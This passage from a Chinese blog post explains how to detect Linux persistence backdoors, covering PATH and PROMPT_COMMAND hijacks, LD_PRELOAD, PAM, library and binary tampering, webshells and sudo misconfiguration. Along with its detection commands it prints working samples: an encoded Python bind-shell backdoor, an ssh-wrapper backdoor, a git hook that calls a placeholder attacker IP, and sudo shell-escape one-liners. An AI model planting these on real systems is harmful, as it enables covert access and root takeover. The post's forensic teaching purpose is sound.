+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -n &quot;PATH=\|:\$PATH&quot; ~/.* 2&gt;/dev/null</span><br><span class="line">grep -rn &quot;PATH=\|:\$PATH&quot; /etc/profi* 2&gt;/dev/null</span><br><span class="line">grep -n &quot;PATH=\|:\$PATH&quot; /etc/bashrc 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>检查结果中是否存在非常见的目录如：家目录、/tmp目录。</p>
+<p>攻击类型2：利用$PATH的缺陷。</p>
+<p>攻击者在现有的高优先级的目录中放置同名后门程序，劫持低目录中的程序。排查命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 例如攻击者通过在/usr/<span class="built_in">local</span>/sbin或/usr/<span class="built_in">local</span>/bin中部署后门程序如sudo，可以优先于原本/usr/bin/sudo执行。</span></span><br><span class="line">find /usr/local/sbin -perm -100 -type f&gt; 1.txt</span><br><span class="line">find /usr/local/bin -perm -100 -type f &gt;&gt;1.txt</span><br><span class="line">find /home -perm -100 -type f &gt;&gt;1.txt</span><br><span class="line">find /root -perm -100 -type f &gt;&gt;1.txt</span><br><span class="line">cat 1.txt|sort|uniq -c|sort -nr|head -n 10</span><br></pre></td></tr></table></figure>
+
+<h5 id="PROMPT-COMMAND后门"><a href="#PROMPT-COMMAND后门" class="headerlink" title="$PROMPT_COMMAND后门"></a>$PROMPT_COMMAND后门</h5><p>该环境变量通俗来说用于在执行每条命令前执行命令，不少运维人员利用它来做历史记录加固，但是攻击者同样可以利用它来插入后门逻辑。排查命令如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -n &quot;PROMPT_COMMAND&quot; ~/.* 2&gt;/dev/null</span><br><span class="line">grep -rn &quot;PROMPT_COMMAND&quot; /etc/profi* 2&gt;/dev/null</span><br><span class="line">grep -n &quot;PROMPT_COMMAND&quot; /etc/bashrc 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>正常的该环境变量内容应该是关于shell的界面显示：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">    PROMPT_COMMAND=<span class="string">&#x27;echo -ne &quot;\033]0;$&#123;USER&#125;@$&#123;HOSTNAME&#125;: $&#123;PWD&#125;\007&quot;&#x27;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>或是结合历史记录加固的：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history -a; history -a; printf &quot;\033]0;%s@%s:%s\007&quot; &quot;$&#123;USER&#125;&quot; &quot;$&#123;HOSTNAME%%.*&#125;&quot; &quot;$&#123;PWD/#$HOME/~&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>而下面这种情况是一条利用环境变量来做bind shell的后门。每一次执行先检查端口有没有占用，如果没占用，立马开一个后门端口。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PROMPT_COMMAND=&quot;lsof -i:23333 &amp;&gt;/dev/null || (python2 -c \&quot;exec(&#x27;aW1wb3J0IHNvY2tldCxvcyxzeXMKcz1zb2NrZXQuc29ja2V0KCkKcy5iaW5kKCgiIiwyMzMzMykpCnMubGlzdGVuKDEpCihjLGEpPXMuYWNjZXB0KCkKd2hpbGUgMToKIGQ9Yy5yZWN2KDUxMikKIGlmICdleGl0JyBpbiBkOgogIHMuY2xvc2UoKQogIHN5cy5leGl0KDApCiByPW9zLnBvcGVuKGQpLnJlYWQoKQogYy5zZW5kKHIpCg==&#x27;.decode(&#x27;base64&#x27;))\&quot; 2&gt;/dev/null &amp;)&quot;</span><br></pre></td></tr></table></figure>
+
+<h5 id="LD-PRELOAD后门"><a href="#LD-PRELOAD后门" class="headerlink" title="$LD_PRELOAD后门"></a>$LD_PRELOAD后门</h5><p>$LD_PRELOAD用于指定程序动态库的加载。动态库的加载满足下面的定义顺序：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">LD_PRELOAD&gt;<span class="variable">$LD_LIBRARY_PATH</span>&gt;/etc/ld.so.cache&gt;/lib&gt;/usr/lib</span></span><br></pre></td></tr></table></figure>
+
+<p>故而，攻击者利用该环境变量定义的库文件可以实现对函数的劫持。</p>
+<p>排查命令如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -n &quot;LD_PRELOAD&quot; ~/.* 2&gt;/dev/null</span><br><span class="line">grep -rn &quot;LD_PRELOAD&quot; /etc/profi* 2&gt;/dev/null</span><br><span class="line">grep -n &quot;LD_PRELOAD&quot; /etc/bashrc 2&gt;/dev/null</span><br><span class="line"><span class="meta">#</span><span class="bash">观察结果内是否存在形如：<span class="built_in">export</span> LD_PRELOAD=/xxxx/xxx.so</span></span><br></pre></td></tr></table></figure>
+
+<p>如果系统内正在运行的进程存在加载了该环境变量的可能，通过检查/proc/*/environ也能快速定位到受影响的进程。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/*/environ |tr &#x27;\0&#x27; &#x27;\n&#x27;|grep LD_PRELOAD</span><br><span class="line">grep -rn LD_PRELOAD /proc/*/environ</span><br></pre></td></tr></table></figure>
+
+<h5 id="LD-LIBRARY-PATH后门"><a href="#LD-LIBRARY-PATH后门" class="headerlink" title="$LD_LIBRARY_PATH后门"></a>$LD_LIBRARY_PATH后门</h5><p>与$LD_PRELOAD后门检测方法基本一致：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -n &quot;LD_LIBRARY_PATH&quot; ~/.* 2&gt;/dev/null</span><br><span class="line">grep -rn &quot;LD_LIBRARY_PATH&quot; /etc/profi* 2&gt;/dev/null</span><br><span class="line">grep -n &quot;LD_LIBRARY_PATH&quot; /etc/bashrc 2&gt;/dev/null</span><br><span class="line"><span class="meta">#</span><span class="bash"> 观察结果内是否存在形如：<span class="built_in">export</span> LD_LIBRARY_PATH =/xxxx/xxx.so</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-5-篡改库文件"><a href="#1-5-篡改库文件" class="headerlink" title="1.5 篡改库文件"></a>1.5 篡改库文件</h3><h4 id="1-5-1-pam后门"><a href="#1-5-1-pam后门" class="headerlink" title="1.5.1 pam后门"></a>1.5.1 pam后门</h4><p>“Linux-PAM（即linux可插入认证模块）是一套共享库,使本地系统管理员可以随意选择程序的认证方式。换句话说，不用(重新编写)重新编译一个包含PAM功能的应用程序，就可以改变它使用的认证机制，这种方式下，就算升级本地认证机制,也不用修改程序。”换个角度来看，如果攻击者可以通过篡改pam模块达到劫持认证的目的。</p>
+<p>PAM配置应用认证方式的文件在/etc/pam.d/目录下。调用的模块库:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RHEL:/usr/lib64/security/</span><br><span class="line">Debian: /usr/lib/x86_64-linux-gnu/security/</span><br></pre></td></tr></table></figure>
+
+<p>主要的利用方式有两种：</p>
+<p>（1）    篡改配置文件，加入攻击者自定义的pam库文件。<br>sshLooterC就是这样一个工具。 <a target="_blank" rel="noopener" href="https://github.com/mthbernardes/sshLooterC">https://github.com/mthbernardes/sshLooterC</a><br>试了下RHEL上可以运行，Debian上有些问题，通过在/etc/pam.d/common-auth中插入编译好的so文件，并将编译好的劫持库放到目录下即可。</p>
+<p>取证的方法就是检查配置文件有没有被篡改。如果系统支持包管理检查的话，可以确认以下有没有配置文件被改了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -V `rpm -qf /etc/pam.d/system-auth`</span><br></pre></td></tr></table></figure>
+
+<p>（2）    源码修改并替换库文件，从而实现后门植入。<br>下面两篇文章中，作者分别实现了这种方式的后门植入。<br>Debian:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/adhzl/p/12098397.html">https://www.cnblogs.com/adhzl/p/12098397.html</a><br>RHEL:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7902">https://xz.aliyun.com/t/7902</a></p>
+<p>取证的过程分为以下几步：</p>
+<ol>
+<li>   确定pam版本。rpm -qa | grep pam（或，dpkg -l | grep pam）</li>
+<li>   下载对应版本源码。<a target="_blank" rel="noopener" href="http://www.linux-pam.org/library/">http://www.linux-pam.org/library/</a></li>
+<li>   编译。（./configure &amp;&amp; make）</li>
+<li>   比较so文件散列值。</li>
+<li>   分析异常so文件。</li>
+</ol>
+<p>pam对大多数人而言可能比较生疏，这里有一些文章可以看看。<br>[1] Linux下PAM模块学习总结<a target="_blank" rel="noopener" href="https://www.cnblogs.com/kevingrace/p/8671964.html">https://www.cnblogs.com/kevingrace/p/8671964.html</a></p>
+<h4 id="1-5-2-etc-ld-so-cache"><a href="#1-5-2-etc-ld-so-cache" class="headerlink" title="1.5.2 /etc/ld.so.cache"></a>1.5.2 /etc/ld.so.cache</h4><p>/etc/ld.so.cache可以认为是程序的动态链接库字典，需要动态链接的程序会在系统内的动态加载器的帮助下读取/etc/ld.so.cache进而获得要用到的库文件。因而攻击者通过篡改该文件的内容，可以实现插入后门劫持程序运行的效果。这一技术在一些rootkit中常被使用。</p>
+<p>检查方式是确定库文件的归属，通过下载对应版本的安装包或使用包管理器检查该库文件是否被篡改。</p>
+<p>（1）下面的例子中使用包管理器检查某库文件。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">以debian下某库文件libBLT为例</span></span><br><span class="line">cat /etc/ld.so.cache|tr &#x27;\0&#x27; &#x27;\n&#x27; |grep libBLT</span><br><span class="line">ls -il /lib/libBLT.2.5.so.8.6 #获得inode</span><br><span class="line">dkpg -S /usr/lib/libBLT.2.5.so.8.6 #获得二进制所属的包</span><br><span class="line">dpkg -V tk8.6-blt2.5 #dpkg自检</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">RHEL下</span></span><br><span class="line">rpm -qf $filename</span><br><span class="line">rpm -V $package</span><br></pre></td></tr></table></figure>
+
+<p>（2）下面的例子中通过比对官方包散列值来检查某库文件。</p>
+<p>Debian系：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get download xxx					#只下载</span><br><span class="line">dpkg -X ./xxx.deb extract				#解压到extract目录</span><br></pre></td></tr></table></figure>
+
+<p>RHEL系：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install --downloadonly --downloaddir=/tmp/ XXX	#只下载</span><br><span class="line">rpm2cpio xxx.rpm | cpio -div						#解压到当前目录</span><br></pre></td></tr></table></figure>
+
+<p>将待分析的so文件与解压后得到的文件使用md5sum比对散列值。</p>
+<h4 id="1-5-3-etc-ld-so-preload"><a href="#1-5-3-etc-ld-so-preload" class="headerlink" title="1.5.3 /etc/ld.so.preload"></a>1.5.3 /etc/ld.so.preload</h4><p>网上不少文章提到该库文件，但看了一下本人的好几套环境上都没有该配置文件，因此真实性不做保证。这里留下来只是作为以防万一。</p>
+<p>该配置文件作用与LD_PRELOAD类似，帮助程序预先加载一些库文件，内容与/etc/ld.so.cache。</p>
+<p>因此，排查方法与/etc/ld.so.cache类似，使用包管理器确定其中的库文件来源并检查库文件是否被篡改。</p>
+<h3 id="1-6-篡改命令文件"><a href="#1-6-篡改命令文件" class="headerlink" title="1.6 篡改命令文件"></a>1.6 篡改命令文件</h3><p>篡改文件有两类常见的手法，一类是用含有后门逻辑的脚本文件替换掉命令文件，一类通过修改文件源码再编译。</p>
+<p>使用包管理器检查能检查通过包管理器安装的程序。对于不支持包管理检查的文件或系统，发现脚本类替换相对容易，但发现源码修改再编译的后门则比较困难。</p>
+<h4 id="1-6-1-包管理器自检"><a href="#1-6-1-包管理器自检" class="headerlink" title="1.6.1 包管理器自检"></a>1.6.1 包管理器自检</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RHEL：rpm -aV</span><br><span class="line">Debian：dpkg -V</span><br></pre></td></tr></table></figure>
+
+<p>这种方式依赖系统内包管理器可正常工作的情况。同时还要求被查的软件或二进制是采用源安装方式。如果采用pip，源码编译等方式进行安装，那就发现不了。</p>
+<h4 id="1-6-2-检查脚本文件"><a href="#1-6-2-检查脚本文件" class="headerlink" title="1.6.2 检查脚本文件"></a>1.6.2 检查脚本文件</h4><p>使用下面给出的命令能快速检查常用程序目录下的脚本是否属于被篡改的脚本，如果包管理没有识别到该脚本的归属，单独查看内容进行分析即可，不常见的命令可以不用管。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Debian:</span></span><br><span class="line">find /usr/*bin /usr/local/*bin -type f -exec file &#123;&#125; \; |grep -v ELF|awk -F: &#x27;&#123;print $1&#125;&#x27;|xargs dpkg -S|awk -F: &#x27;&#123;print $1&#125;&#x27;|dpkg -V</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> RHEL:</span></span><br><span class="line">find /usr/*bin /usr/local/*bin -type f -exec file &#123;&#125; \; | grep -v ELF|awk -F: &#x27;&#123;print $1&#125;&#x27;|xargs rpm -qf|sort -n|uniq|xargs rpm -V</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-6-3-检查ELF文件"><a href="#1-6-3-检查ELF文件" class="headerlink" title="1.6.3 检查ELF文件"></a>1.6.3 检查ELF文件</h4><p>（1）文件校验<br>实际场景下很少做这种检查，因为这种方法难以在取证场景下大量快速的展开，消耗时间与人力代价很大。</p>
+<p>下面以一个OpenSSH后门排查为例。</p>
+<p>首先确定二进制归属与版本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dpkg -S /usr/sbin/sshd</span><br><span class="line">dpkg -l openssh-server</span><br><span class="line">(RHEL下对应于rpm -qf /usr/sbin/sshd结果直接包含版本号)</span><br></pre></td></tr></table></figure>
+
+<p>接着去开源社区搜一下，下载对应的deb包或rpm包、bin包。通过解压或执行的方式获得其中的二进制文件，算一遍散列值进行比对。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Debian-deb：</span></span><br><span class="line">dpkg -X ./xxx.deb extract	#解压到extract目录</span><br><span class="line">dpkg -i ./xxx.deb			#安装该deb包</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> RHEL-rpm：</span></span><br><span class="line">rpm2cpio xxx.rpm | cpio -div	#解压到当前目录</span><br><span class="line">rpm -i xxx.rpm			#安装该rpm包</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> bin文件：</span></span><br><span class="line">chmod +x xxx.bin; ./xxx.bin</span><br></pre></td></tr></table></figure>
+
+<p>这类文件比较特殊，可以在虚拟机里面安装后获得二进制，再算散列值。</p>
+<p>（2）进程分析<br>这种排查方式的代价更高，同时可能需要沙箱环境。如果这种进程分析搞不定可能还需要文件逆向分析。</p>
+<p>以进程分析OpenSSH后门为例。starce -ff -p $sshd_pid可以捕获到的正常的SSH登录中抓到的账户名及密码。如果OpenSSH-Server被篡改了，那么在该部分往后应该会有读写文件或创建socket外发的操作，具体的操作取决于攻击者的手段与目的（窃取型的可以直接写到本地也可以创建socket外发，口令鉴权绕过的除了硬编码口令应该也会存在其他绕过手段）。实际操作起来还会有很多问题，时间代价与精力代价都很高。</p>
+<p>下面是一些此类后门的相关文章。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bigdevilking/p/9535427.html">https://www.cnblogs.com/bigdevilking/p/9535427.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jouny/p/4688194.html">https://www.cnblogs.com/jouny/p/4688194.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/153364.html">https://www.freebuf.com/news/153364.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/croso/p/5280783.html">https://www.cnblogs.com/croso/p/5280783.html</a><br><a target="_blank" rel="noopener" href="https://www.moonsec.com/archives/1720">https://www.moonsec.com/archives/1720</a></p>
+<p>（3）逆向工程</p>
+<p>略。</p>
+<h4 id="1-6-4-条件触发型后门"><a href="#1-6-4-条件触发型后门" class="headerlink" title="1.6.4 条件触发型后门"></a>1.6.4 条件触发型后门</h4><p>在正常使用操作中，用户无法感知，只有满足一定条件下才能触发后门逻辑的后门。检查的重点在于文件是否被篡改。有以下几种方式能够帮助检查：1.包管理器自检；2.md5sum比对；3.查看文件内容。</p>
+<p>下面是一个典型ssh-wrapper后门的形式。此后门要求连接ssh的源端口满足指定的条件就能出发任意密码登录。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/sbin</span><br><span class="line">mv sshd ../bin</span><br><span class="line">vi sshd</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;&gt;&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/perl</span></span><br><span class="line">exec&quot;/bin/sh&quot;if(getpeername(STDIN)=~/^..4A/);</span><br><span class="line">exec&#123;&quot;/usr/bin/sshd&quot;&#125;&quot;/usr/sbin/sshd&quot;,@ARGV;</span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class="line"><span class="meta">#</span><span class="bash">netstat -ntuap结果无异常<span class="built_in">bind</span>端口，无异常socket连接。但用socat指定源端口登录时会直接登陆上</span></span><br><span class="line">socat STDIO TCP4:10.18.180.20:22,sourceport=13377</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-7-其他"><a href="#1-7-其他" class="headerlink" title="1.7 其他"></a>1.7 其他</h3><h4 id="1-7-1-ssh软链接后门"><a href="#1-7-1-ssh软链接后门" class="headerlink" title="1.7.1 ssh软链接后门"></a>1.7.1 ssh软链接后门</h4><p>软链接后门是一种比较特殊的后门，形式如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /xxx/su;/xxx/su -oPort=$port_num</span><br></pre></td></tr></table></figure>
+
+<p>使用ps aux &amp;&amp; netstat -ntaup等命令查看进程名时能快速发现该后门，特点在于文件名必须为su。</p>
+<h4 id="1-7-2-Git-hooks后门（未证实）"><a href="#1-7-2-Git-hooks后门（未证实）" class="headerlink" title="1.7.2 Git hooks后门（未证实）"></a>1.7.2 Git hooks后门（未证实）</h4><p>利用git commit时触发反弹shell的逻辑。典型形式如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;xterm -display &lt;attacker IP&gt;:1 &amp;&quot; &gt; .git/hooks/pre-commit</span><br><span class="line">chmod +x .git/hooks/pre-commit</span><br><span class="line"></span><br><span class="line">Xnest:1</span><br></pre></td></tr></table></figure>
+
+<p>排查方式：所有本地的仓库内是否含有该文件及xterm关键字。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name .git -exec grep -nr xterm &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-webshell-分析"><a href="#2-webshell-分析" class="headerlink" title="2 webshell 分析"></a>2 webshell 分析</h2><p>在web安全中，我们常用webshell实现对网站的控制，对于有文件的webshell，进行查找和取证相对容易。</p>
+<h3 id="2-1-常用webshell专杀工具"><a href="#2-1-常用webshell专杀工具" class="headerlink" title="2.1 常用webshell专杀工具"></a>2.1 常用webshell专杀工具</h3><p>D盾 <a target="_blank" rel="noopener" href="http://www.d99net.net/down/d_safe_2.1.5.4.zip">http://www.d99net.net/down/d_safe_2.1.5.4.zip</a></p>
+<p>河马webshell查杀 <a target="_blank" rel="noopener" href="https://www.shellpub.com/">https://www.shellpub.com/</a></p>
+<p>安全狗 <a target="_blank" rel="noopener" href="http://free.safedog.cn/website_safedog.html">http://free.safedog.cn/website_safedog.html</a></p>
+<h3 id="2-2-目录手工分析"><a href="#2-2-目录手工分析" class="headerlink" title="2.2 目录手工分析"></a>2.2 目录手工分析</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 下面两条适合对上传目录的粗筛</span></span><br><span class="line">grep -rn &quot;php\|&lt;%\|md5\|POST\|GET&quot; upload/</span><br><span class="line">find upload/ -name *.php *php* *.jsp *tml *.jar *.war</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 有备份文件时可以做备份比对</span></span><br><span class="line">vimdiff &lt;(cd $webroot_path; find . -exec md5sum &#123;&#125; \; | sort -k 2) &lt;(cd $webroot_bakpath; find . -exec md5sum &#123;&#125; \; | sort -k 2)</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">时间戳排序，注意最早及最晚的</span></span><br><span class="line">for i in `find /var/www/html/ -type f`;do a=`stat $i|sed -n 6p`; echo &quot;$a  $i&quot;; done |sort -nr</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-web日志分析"><a href="#2-3-web日志分析" class="headerlink" title="2.3 web日志分析"></a>2.3 web日志分析</h3><p>一般来说，web日志的数据量很大，对分析人员手工分析非常不友好。<br>下面给出默认情况下，常见web服务器的默认日志路径：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">debian-nginx:		/var/log/nginx/access.log</span><br><span class="line">debian-apache:		/var/log/apache2/access.log </span><br><span class="line">centos-apache:		/var/log/httpd/access_log</span><br><span class="line">centos-nginx:		/var/log/nginx/access.log </span><br></pre></td></tr></table></figure>
+
+<p>如果支持web日志导出，可以使用一些web日志分析工具进行分析，这类工具是有一定片面性的，一者日志可能无法记录到post的内容，导致很多webshell事件会被漏报，二者在使用过程中可能还需要手工再次甄别分析结果。</p>
+<p>360的星图日志分析 <a target="_blank" rel="noopener" href="https://www.jb51.net/softs/270178.html">https://www.jb51.net/softs/270178.html</a></p>
+<p>在通过web查杀工具或web文件备份比对时，如果识别出了部分疑似文件，我们也能在日志中过滤一下，识别是否存在对该文件的访问进而确定攻击时间。</p>
+<h2 id="3-提权类后门排查"><a href="#3-提权类后门排查" class="headerlink" title="3 提权类后门排查"></a>3 提权类后门排查</h2><p>提权后门的取证在实际场合下意义不大。</p>
+<p>一般来说攻击者具备提权为root的能力后都会直接在root权限下做持久化，以免每一次登录都要走一遍提权流程很麻烦。</p>
+<h3 id="3-1-suid-shell"><a href="#3-1-suid-shell" class="headerlink" title="3.1 suid shell"></a>3.1 suid shell</h3><p>方法就是检查所有属主的x位被置为s的文件。检查方式是使用包管理器检查或二进制逆向的方式检查所有输出的结果。<br>find / -perm -4000 -uid 0 2&gt;/dev/null</p>
+<h3 id="3-2-sudo配置不当-受限命令绕过"><a href="#3-2-sudo配置不当-受限命令绕过" class="headerlink" title="3.2 sudo配置不当-受限命令绕过"></a>3.2 sudo配置不当-受限命令绕过</h3><p>部分自带参数执行shell命令的命令如果经sudo配置下发给普通用户，普通用户可以用该参数提权为root。但在实际场景下基本遇不到，即便sudo的配置存在该问题，如果历史记录没记录到就无法取证该事件。</p>
+<p>这种场景下sudo配置文件常常添加了形如如下的配置：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">testme ALL=(ALL) NOPASSWD: /usr/bin/vi</span><br><span class="line">apache ALL=(root) NOPASSWD:/usr/bin/zip</span><br></pre></td></tr></table></figure>
+
+<p>除了上面的命令vi与zip以外，还包括很多命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar/more/less/man/ftp/python/vim/find/strace/git/passwd/awk</span><br></pre></td></tr></table></figure>
+
+<p>对应攻击者进行利用的方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sudo zip ./7.zip /tmp -T --unzip-command=&quot;sh -c /bin/bash&quot;</span><br><span class="line">sudo tar cf /dev/null test.tar --checkpoint=1 --checkpoint-action=exec=/bin/bash</span><br><span class="line">sudo more /tmp/a.txt ; !/bin/bash</span><br><span class="line">sudo less /tmp/a.txt; !/bin/bash</span><br><span class="line">sudo man ssh; !/bin/bash</span><br><span class="line">sudo ftp; !/bin/bash</span><br><span class="line">sudo vim -c &#x27;!sh&#x27;</span><br><span class="line">sudo find /bin/ -name ls -exec &#x27;/bin/bash&#x27; \;</span><br><span class="line">sudo strace -o /dev/null /bin/bash</span><br><span class="line">echo &quot;os.execute(&#x27;/bin/bash&#x27;)&quot; &gt; /tmp/shell.nse</span><br><span class="line">sudo nmap --script=/tmp/shell.nse</span><br><span class="line">sudo git help status;!/bin/bash</span><br><span class="line">sudo passwd</span><br><span class="line">sudo awk &#x27;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br><span class="line">sudo /usr/bin/python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-目录或文件与进程的属主不一致导致提权"><a href="#3-3-目录或文件与进程的属主不一致导致提权" class="headerlink" title="3.3 目录或文件与进程的属主不一致导致提权"></a>3.3 目录或文件与进程的属主不一致导致提权</h3><p>由root等高权限用户周期性调用执行的文件 被部署在其他用户的家目录下（或该文件的属主为其他用户时），则当该用户失陷时，攻击者可以篡改该文件的内容，诱导root执行高风险的操作。</p>
+<p>实际场景下很难取证，因此不做展开。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%8F%96%E8%AF%81/" rel="tag"># 取证</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(7)-%E5%BC%82%E5%B8%B8%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/" rel="prev" title="Linux入侵事件取证(7)-异常进程分析">
+                  <i class="fa fa-chevron-left"></i> Linux入侵事件取证(7)-异常进程分析
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/06/22/%E5%9B%BD%E5%86%85%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AF%86%E7%A0%81%E7%BC%96%E6%8E%92%E6%A8%A1%E5%BC%8F/" rel="next" title="国内常见的密码编排模式">
+                  国内常见的密码编排模式 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">aplyc1a</span>
+</div>
